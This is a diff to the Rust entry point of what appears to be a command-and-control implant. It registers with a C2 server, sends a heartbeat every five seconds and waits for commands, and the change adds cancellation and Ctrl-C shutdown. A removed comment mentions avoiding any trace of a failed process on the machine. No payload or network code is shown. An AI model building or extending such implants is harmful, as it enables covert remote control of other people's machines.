@@ -4,7 +4,11 @@ mod identity;
 
 use std::process::exit;
 
-use tokio::time::{Duration, sleep};
+use tokio::{
+    signal,
+    time::{Duration, sleep},
+};
+use tokio_util::sync::CancellationToken;
 
 use crate::{c2com::C2Com, identity::Identity};
 
@@ -22,17 +26,31 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     register_self(&mut c2com, &identity).await;
 
-    // todo: loop waiting for commands from c2
-    tokio::spawn(async move {
-        if let Err(err) = wait_for_work().await {
-            println!("worker thread has errored: {err}");
-            exit(0); // exit with 0. dont want to leave any trace of a failed process on the machine.
+    let ct = CancellationToken::new();
+    let worker_ct = ct.clone();
+    let worker_thread = tokio::spawn(async move {
+        tokio::select! {
+            _ = worker_ct.cancelled() => {}
+            result = wait_for_work() => {
+                if let Err(err) = result {
+                    println!("worker thread has errored: {err}");
+                }
+            }
         }
     });
 
     loop {
-        c2com.heartbeat(&identity).await;
-        sleep(Duration::from_secs(5)).await;
+        tokio::select! {
+            _ = signal::ctrl_c() => {
+                println!("shutting down...");
+                ct.cancel();
+                let _ = worker_thread.await;
+                exit(0);
+            }
+            _ = sleep(Duration::from_secs(5)) => {
+                c2com.heartbeat(&identity).await;
+            }
+        }
     }
 }
 
